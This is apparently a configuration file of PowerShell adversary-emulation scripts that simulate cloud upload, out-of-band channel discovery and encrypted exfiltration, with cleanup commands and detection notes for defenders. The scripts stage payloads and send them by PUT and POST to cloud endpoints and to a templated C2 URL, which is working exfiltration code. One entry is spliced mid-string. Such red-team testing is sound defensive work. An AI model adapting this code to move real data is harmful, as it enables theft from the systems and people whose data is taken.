scripts.cleanup_command: Unregister-ScheduledTask -TaskName 'MorganaExfilSim-T1029' -Confirm:$false -ErrorAction SilentlyContinue; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_exfil_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1029 cleanup: scheduled task removed, staging dir deleted'

scripts.name: Excalibur - Exfil-T1537-Transfer Data to Cloud Account
scripts.description: Simulates adversary transfer of data to a cloud account using legitimate cloud CLI tools: (1) attempts to enumerate Azure CLI (az.exe) and Azure PowerShell (Az module) and simulate a storage blob upload command (AzCopy/az storage blob upload pattern); (2) checks for AWS CLI and simulates an s3 cp upload command; (3) simulates the Microsoft Graph API upload-to-OneDrive pattern via direct HTTP PUT. All actual upload commands are constructed and printed but not executed against real cloud accounts. CLI binary invocations and Graph API calls are both MDE behavioral indicators for data transfer to cloud storage.
scripts.command: Write-Host '[START] T1537 - Transfer Data to Cloud Account (Azure/AWS/OneDrive CLI exfil simulation)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_exfil_staging_dir}'); $payloadKb = [int]'#{excalibur_exfil_payload_kb}'; if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; $exfilFile = Join-Path $stagingDir 'cloud-exfil-payload.xlsx'; $payloadBytes = New-Object byte[] ($payloadKb * 1024); [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($payloadBytes); [System.IO.File]::WriteAllBytes($exfilFile, $payloadBytes); Write-Host ('[INFO] Payload file: ' + $exfilFile + ' (' + $payloadKb + ' KB)'); Write-Host '[INFO] Method 1/3: Azure CLI + AzCopy cloud storage upload (az storage blob upload pattern)'; $azPaths = @('C:\Program Files (x86)\Microsoft SDKs\Azure\CLI2\wbin\az.cmd', (Join-Path $env:LOCALAPPDATA 'Programs\Microsoft SDKs\Azure\CLI2\wbin\az.cmd')); $azFound = $azPaths | Where-Object { Test-Path $_ } | Select-Object -First 1; if ($azFound) { Write-Host ('[INFO] Azure CLI found: ' + $azFound); try { & $azFound account show 2>&1 | Select-Object -First 3 | ForEach-Object { Write-Host ('[INFO]   az account: ' + $_) }; Write-Host ('[INFO] Simulated upload command (NOT executed against real account): az storage blob upload --file "' + $exfilFile + '" --container-name exfil --name exfil-payload.xlsx --account-name morganaexfiltest') } catch {} } else { Write-Host '[INFO] Azure CLI: not installed (constructing simulated command for telemetry)'; $env:AZURE_STORAGE_ACCOUNT = 'morganaexfiltest'; try { $azUrl = 'https://morganaexfiltest.blob.core.windows.net/exfil/cloud-exfil-payload.xlsx'; $azHeaders = @{ 'x-ms-blob-type'='BlockBlob'; 'x-ms-version'='2020-10-02'; 'Authorization'='SharedKey morganaexfiltest:MorganaSimKey'; 'Content-Type'='application/octet-stream' }; Invoke-WebRequest -Uri $azUrl -Method PUT -Headers $azHeaders -Body $payloadBytes -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null; Write-Host '[INFO] Azure Blob PUT: succeeded' } catch { Write-Host ('[INFO] Azure Blob PUT: ' + $_.Exception.Message.Split([char]10)[0] + ' (outbound to Azure Blob Storage logged by MDE)') } }; Write-Host '[INFO] Method 2/3: AWS CLI S3 upload simulation (s3 cp exfil pattern)'; $awsCli = Get-Command aws -ErrorAction SilentlyContinue; if ($awsCli) { Write-Host ('[INFO] AWS CLI found: ' + $awsCli.Source); Write-Host ('[INFO] Simulated command: aws s3 cp "' + $exfilFile + '" s3://morgana-exfil-sim-bucket/exfil-payload.xlsx --region us-east-1'); try { $env:AWS_ACCESS_KEY_ID = 'AKIAMORGANATEST00001'; $env:AWS_SECRET_ACCESS_KEY = 'MorganaSimSecretKey'; & aws sts get-caller-identity 2>&1 | Select-Object -First 2 | ForEach-Object { Write-Host ('[INFO]   aws sts: ' + $_) }; Remove-Item Env:AWS_ACCESS_KEY_ID -ErrorAction SilentlyContinue; Remove-Item Env:AWS_SECRET_ACCESS_KEY -ErrorAction SilentlyContinue } catch {} } else { Write-Host '[INFO] AWS CLI: not installed (attempting S3 HTTP PUT for telemetry)'; try { $s3Url = 'https://morgana-exfil-sim-bucket.s3.amazonaws.com/cloud-exfil-payload.xlsx'; Invoke-WebRequest -Uri $s3Url -Method PUT -Body $payloadBytes -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null } catch { Write-Host ('[INFO] S3 PUT: ' + $_.Exception.Message.Split([char]10)[0] + ' (outbound to S3 endpoint logged by MDE)') } }; Write-Host '[INFO] Method 3/3: OneDrive/SharePoint upload via Microsoft Graph API'; try { $graphHeaders = @{ 'Authorization'='Bearer MorganaSimGraphToken'; 'Content-Type'='application/octet-stream'; 'User-Agent'='MorganaTest-T1537-CloudExfil/1.0' }; Invoke-WebRequest -Uri 'https://graph.microsoft.com/v1.0/me/drive/root:/morgana-exfil-payload.xlsx:/content' -Method PUT -Headers $graphHeaders -Body $payloadBytes -TimeoutSec 5 -UseBasicParsing -ErrorAction Stop | Out-Null; Write-Host '[INFO] Graph OneDrive upload: succeeded' } catch { Write-Host ('[INFO] Graph OneDrive upload: ' + $_.Exception.Message.Split([char]10)[0] + ' (Graph API PUT logged by MDE - cloud account exfil)') }; Write-Host '[SUCCESS] T1537 - Cloud account transfer simulation completed. scripts.id: Excalibur - Exfil-T1011-Exfiltration Over Other Network Medium
scripts.name: Excalibur - Exfil-T1011-Exfiltration Over Other Network Medium
scripts.description: Simulates exfiltration over other network mediums (non-standard network interfaces): (1) Bluetooth device discovery enumeration using WMI Win32_PnPEntity (checks for paired/visible Bluetooth devices that could serve as exfil medium); (2) Wi-Fi Direct device discovery and available Wi-Fi network scan (Wi-Fi can be used as an out-of-band exfil medium when wired network is monitored); (3) enumerates all active network adapters including VPN/tunnel interfaces that could serve as secondary exfil paths. The enumeration of alternative network interfaces combined with staged sensitive data is a Sentinel indicator.
scripts.command: Write-Host '[START] T1011 - Exfiltration Over Other Network Medium (Bluetooth/Wi-Fi/alternate interface discovery)'; Write-Host '[INFO] Step 1/3: Bluetooth device enumeration (WMI + registry scan)'; try { $btAdapter = Get-WmiObject -Class Win32_PnPEntity -ErrorAction SilentlyContinue | Where-Object { $_.Name -match 'Bluetooth' -or $_.Description -match 'Bluetooth' }; Write-Host ('[INFO] Bluetooth PnP devices found: ' + @($btAdapter).Count); $btAdapter | Select-Object -First 5 | ForEach-Object { Write-Host ('    ' + $_.Name + ' | Status: ' + $_.Status) }; $btRadioKey = 'HKLM:\SYSTEM\CurrentControlSet\Services\BthServ'; if (Test-Path $btRadioKey) { $btSvc = Get-ItemProperty -Path $btRadioKey -ErrorAction SilentlyContinue; Write-Host ('[INFO] Bluetooth service (BthServ) Start=' + $btSvc.Start + ' (0=Boot,1=System,2=Auto,3=Manual,4=Disabled)') } else { Write-Host '[INFO] BthServ key not found (Bluetooth may not be installed)' } } catch { Write-Host ('[INFO] Bluetooth enum: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 2/3: Wi-Fi network scan (available SSIDs + Wi-Fi Direct profile)'; try { $netshWifi = & netsh.exe wlan show networks mode=bssid 2>&1; $ssidLines = $netshWifi | Where-Object { $_ -match 'SSID' }; Write-Host ('[INFO] Wi-Fi SSIDs visible: ' + @($ssidLines).Count + ' (potential out-of-band exfil channels)'); $ssidLines | Select-Object -First 5 | ForEach-Object { Write-Host ('    ' + $_.Trim()) }; $wifiDirect = & netsh.exe wlan show interfaces 2>&1 | Where-Object { $_ -match 'Name|State|SSID|BSSID' }; Write-Host ('[INFO] Wi-Fi interface state:'); $wifiDirect | Select-Object -First 4 | ForEach-Object { Write-Host ('    ' + $_.Trim()) } } catch { Write-Host ('[INFO] Wi-Fi scan: ' + $_.Exception.Message) }; Write-Host '[INFO] Step 3/3: All network adapter enumeration (identify alternate exfil interfaces)'; try { $adapters = Get-NetAdapter -ErrorAction SilentlyContinue | Select-Object Name, InterfaceDescription, Status, LinkSpeed; Write-Host ('[INFO] Network adapters total: ' + @($adapters).Count); foreach ($a in $adapters) { $vpnLike = $a.Name -match 'VPN|Tunnel|Tap|tun|wg|WireGuard|Cisco|GlobalProtect|FortiClient|Pulse' -or $a.InterfaceDescription -match 'VPN|Tunnel|TAP'; $exfilRisk = if ($vpnLike) { '(VPN/TUNNEL - potential exfil channel)' } elseif ($a.Name -match 'Wi-Fi|Wireless') { '(WIRELESS - potential OOB exfil)' } elseif ($a.Name -match 'Bluetooth') { '(BLUETOOTH - potential OOB exfil)' } else { '' }; Write-Host ('    ' + $a.Name + ' | ' + $a.Status + ' | ' + $a.LinkSpeed + ' ' + $exfilRisk) } } catch { Write-Host ('[INFO] Adapter enum: ' + $_.Exception.Message) }; Write-Host '[SUCCESS] T1011 - Other network medium exfil simulation completed. Sentinel target: Bluetooth/Wi-Fi device enumeration + alternate network interface discovery (MDE - OOB exfil medium recon behavioral detection)'
scripts.cleanup_command: Write-Host '[INFO] T1011 cleanup: no artefacts - read-only enumeration'
scripts.detection_rule: Bluetooth/Wi-Fi device discovery + alternate network interface enumeration (OOB exfil medium recon)

scripts.name: Excalibur - Exfil-T1022-Data Encrypted Before Transfer
scripts.description: Simulates encryption of data before exfiltration using two patterns adversaries use to evade content inspection: (1) AES-256 CBC encryption with a derived key (PBKDF2-style) - encrypts a synthetic payload, writes the encrypted blob to a temp file with a .tmp extension (typical adversary pattern to avoid content-type detection), then sends it via HTTP POST; (2) XOR-based stream cipher of the payload followed by base64 encoding and HTTP POST with encoding headers that indicate encryption. Both patterns defeat SSL inspection and DLP content scanning. The encrypted payload file creation combined with immediate network transfer is a high-fidelity MDE behavioral signal.
scripts.command: Write-Host '[START] T1022 - Data Encrypted Before Transfer (AES-256 + XOR exfil encryption)'; $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_exfil_staging_dir}'); $payloadKb = [int]'#{excalibur_exfil_payload_kb}'; $c2Url = '#{excalibur_exfil_c2_url}'; if (-not (Test-Path $stagingDir)) { New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null }; $payloadBytes = New-Object byte[] ($payloadKb * 1024); [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($payloadBytes); Write-Host ('[INFO] Plaintext payload: ' + $payloadKb + ' KB synthetic sensitive data'); Write-Host '[INFO] Method 1/2: AES-256 CBC encryption before HTTP POST'; try { $passphrase = 'MorganaExfilKey-' + $env:COMPUTERNAME; $salt = [System.Text.Encoding]::UTF8.GetBytes('MorganaExfilSalt2026'); $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($passphrase, $salt, 10000); $aesKey = $deriveBytes.GetBytes(32); $aesIv = $deriveBytes.GetBytes(16); $aes = [System.Security.Cryptography.Aes]::Create(); $aes.Key = $aesKey; $aes.IV = $aesIv; $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC; $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7; $ms = New-Object System.IO.MemoryStream; $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $aes.CreateEncryptor(), [System.Security.Cryptography.CryptoStreamMode]::Write); $cs.Write($payloadBytes, 0, $payloadBytes.Length); $cs.FlushFinalBlock(); $encBytes = $ms.ToArray(); $cs.Dispose(); $ms.Dispose(); $aes.Dispose(); $encFile = Join-Path $stagingDir ('exfil-' + [System.Guid]::NewGuid().ToString('N').Substring(0,8) + '.tmp'); [System.IO.File]::WriteAllBytes($encFile, $encBytes); Write-Host ('[INFO] AES-256 CBC encrypted: ' + $payloadBytes.Length + ' -> ' + $encBytes.Length + ' bytes | Written to: ' + [System.IO.Path]::GetFileName($encFile) + ' (.tmp extension avoids content type detection)'); $encB64 = [Convert]::ToBase64String($encBytes, 0, [math]::Min(256, $encBytes.Length)); $aesBody = '{ "enc": "AES-256-CBC", "iv": "' + [Convert]::ToBase64String($aesIv) + '", "data": "' + $encB64 + '...", "size": ' + $encBytes.Length + ' }'; try { $aesHeaders = @{ 'Content-Type'='application/json'; 'User-Agent'='MorganaTest-T1022-EncExfil/1.0'; 'X-Encoding'='AES-256-CBC'; 'X-Exfil-Size'=[string]$encBytes.Length }; $resp = Invoke-WebRequest -Uri $c2Url -Method POST -Headers $aesHeaders -Body $aesBody -TimeoutSec 8 -UseBasicParsing -ErrorAction Stop; Write-Host ('[INFO] AES POST: HTTP ' + $resp.StatusCode + ' | Sent ' + $aesBody.Length + ' bytes (encrypted .tmp blob + HTTP POST logged by MDE)') } catch { Write-Host ('[INFO] AES POST: ' + $_.Exception.Message.Split([char]10)[0] + ' (logged by MDE)') } } catch { Write-Host ('[WARN] AES encryption: ' + $_.Exception.Message) }; Write-Host '[INFO] Method 2/2: XOR stream cipher + base64 encoding before HTTP POST'; try { $xorKey = [System.Text.Encoding]::UTF8.GetBytes('MorganaXorKey2026!@#$'); $xorEncrypted = New-Object byte[] $payloadBytes.Length; for ($i = 0; $i -lt $payloadBytes.Length; $i++) { $xorEncrypted[$i] = $payloadBytes[$i] -bxor $xorKey[$i % $xorKey.Length] }; $xorB64 = [Convert]::ToBase64String($xorEncrypted); Write-Host ('[INFO] XOR stream cipher: ' + $payloadBytes.Length + ' bytes | base64 output: ' + $xorB64.Length + ' chars'); $xorBody = '{ "enc": "XOR+B64", "data": "' + $xorB64.Substring(0,[math]::Min(128,$xorB64.Length)) + '...", "keylen": ' + $xorKey.Length + ' }'; try { $xorHeaders = @{ 'Content-Type'='application/json'; 'User-Agent'='MorganaTest-T1022-XorExfil/1.0'; 'X-Encoding'='XOR-Base64' }; $resp2 = Invoke-WebRequest -Uri $c2Url -Method POST -Headers $xorHeaders -Body $xorBody -TimeoutSec 8 -UseBasicParsing -ErrorAction Stop; Write-Host ('[INFO] XOR POST: HTTP ' + $resp2.StatusCode + ' | Sent ' + $xorBody.Length + ' bytes') } catch { Write-Host ('[INFO] XOR POST: ' + $_.Exception.Message.Split([char]10)[0] + ' (logged by MDE)') } } catch { Write-Host ('[WARN] XOR encryption: ' + $_.Exception.Message) }; Write-Host '[SUCCESS] T1022 - Encrypted exfil simulation completed. Sentinel target: Encrypted blob file creation (.tmp) + immediate HTTP POST + X-Encoding headers (MDE - encrypted pre-transfer exfil behavioral detection)'
scripts.cleanup_command: $stagingDir = [System.Environment]::ExpandEnvironmentVariables('#{excalibur_exfil_staging_dir}'); if (Test-Path $stagingDir) { Remove-Item -Path $stagingDir -Recurse -Force -ErrorAction SilentlyContinue }; Write-Host '[INFO] T1022 cleanup: staging dir and encrypted temp files removed'
